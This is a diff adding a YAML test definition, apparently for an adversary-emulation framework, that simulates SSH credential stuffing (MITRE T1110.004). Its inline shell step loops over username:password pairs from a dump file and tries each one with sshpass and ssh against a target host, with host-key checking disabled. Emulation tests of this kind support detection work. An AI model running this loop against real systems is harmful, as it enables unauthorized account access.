@@ -1,0 +1,28 @@
+api_version: "2.0"
+name: SSH Credential Stuffing From FreeBSD
+description: |
+    Using username,password combination from a password dump to login over SSH.
+args:
+    - name: target_host
+      type: string
+      default: localhost
+uuid: a790d50e-7ebf-48de-8daa-d9367e0911d4
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1110: Brute Force'
+    subtechniques:
+        - 'T1110.004: Credential Stuffing'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: ssh-credential-stuffing-from-freebsd
+      inline: |
+        cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
+        for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@{{.Args.target_host}};done
+      executor: sh
+      cleanup:
+        inline: ""
+        executor: sh
